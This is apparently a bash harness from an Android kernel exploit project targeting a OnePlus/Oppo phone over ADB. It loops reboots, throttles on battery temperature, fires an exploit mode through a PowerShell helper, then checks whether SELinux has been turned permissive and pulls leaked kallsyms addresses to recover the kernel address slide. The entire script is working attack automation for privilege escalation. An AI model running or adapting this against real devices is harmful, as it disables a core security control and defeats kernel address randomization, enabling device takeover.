#!/bin/bash
# SINGLE=1 (selinux zero) + harvest checks. Success = harvest_0.txt with
# real kallsyms addresses (permissive landed) OR bootid_readback corrupted
# (store machinery live) on a same-boot re-fire.
ADB="/c/Users/LENOVO/AppData/LOCAL/Microsoft/WinGet/Packages/Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe/platform-tools/adb.exe"
cd "/c/Users/LENOVO/Desktop/HILY installer/Oppo/ghostlock-oneplus"
MAX=${1:-8}
gettemp() { "$ADB" -s 192.168.1.108:5555 shell "dumpsys battery | grep -i temperature" 2>/dev/null | grep -oE "[0-9]+" | head -1; }
for attempt in $(seq 1 "$MAX"); do
  sleep 30; "$ADB" connect 192.168.1.108:5555 >/dev/null 2>&1
  t=$(gettemp); [ -z "$t" ] && t=0
  echo "A$attempt temp=$((${t:-0}/10)).$((${t:-0}%10))C"
  if [ "$t" -ge 750 ]; then echo "HOT"; while :; do sleep 120; t=$(gettemp); [ -z "$t" ] && t=0; [ "$t" -le 500 ] && break; done; fi
  "$ADB" -s 192.168.1.108:5555 shell "rm -f /data/local/tmp/harvest_0.txt /data/local/tmp/bootid_readback" 2>/dev/null
  pre=$("$ADB" -s 192.168.1.108:5555 shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  [ -z "$pre" ] && { echo "A$attempt: no shell"; continue; }
  "$ADB" -s 192.168.1.108:5555 reboot; sleep 5; ok=0
  for i in $(seq 1 90); do sleep 10; out=$("$ADB" connect 192.168.1.108:5555 2>&1)
    if echo "$out" | grep -q "connected to"; then
      bid=$("$ADB" -s 192.168.1.108:5555 shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
      bc=$("$ADB" -s 192.168.1.108:5555 shell "getprop sys.boot_completed" 2>/dev/null | tr -d '\r')
      if [ "$bc" = "1" ] && [ -n "$bid" ] && [ "$bid" != "$pre" ]; then ok=1; break; fi
    fi; done
  [ "$ok" = "1" ] || { echo "A$attempt: reboot failed"; continue; }
  up=$("$ADB" -s 192.168.1.108:5555 shell 'cat /proc/uptime' | tr -d '\r'); up_s=${up%%.*}
  [ "$up_s" -lt 30 ] && sleep $((30-up_s))
  cls=$(powershell -ExecutionPolicy Bypass -File fire_mode.ps1 -ModeEnv "MODE4_WRITE_PROOF=1 WRITE_PROOF_TARGET=fops MODE4_STATIC_CHAIN=1 MODE4_SC_UMASK=1 MODE4_SELFSTAMP=1 SELFSTAMP_SINGLE=1 MODE4_PROOF=1" -TagPrefix "SL_${attempt}" 2>&1 | grep -aoE "CLASS=[A-Z]+" | head -1)
  enf=$("$ADB" -s 192.168.1.108:5555 shell "getenforce" 2>/dev/null | tr -d '\r')
  h0=$("$ADB" -s 192.168.1.108:5555 shell "wc -c < /data/local/tmp/harvest_0.txt 2>/dev/null" | tr -d '\r ')
  hk=$("$ADB" -s 192.168.1.108:5555 shell "head -1 /data/local/tmp/harvest_0.txt 2>/dev/null" | tr -d '\r')
  echo "A$attempt: $cls enforce=$enf harvest=${h0:-0}B [$hk]"
  if [ -n "$hk" ] && echo "$hk" | grep -qE "^[0-9a-f]{12,16} "; then
    echo "*** SELINUX LANDED — KALLSYMS OPEN — HARVESTING SLIDE ***"
    "$ADB" -s 192.168.1.108:5555 shell "head -5 /data/local/tmp/harvest_0.txt; grep -m1 ' _text$' /data/local/tmp/harvest_0.txt" | tr -d '\r'
    "$ADB" -s 192.168.1.108:5555 pull /data/local/tmp/harvest_0.txt slide_kallsyms.txt 2>/dev/null
    exit 0
  fi
  if [ "$enf" = "Permissive" ]; then echo "*** PERMISSIVE ***"; exit 0; fi
done
echo "selinux campaign exhausted"; exit 1
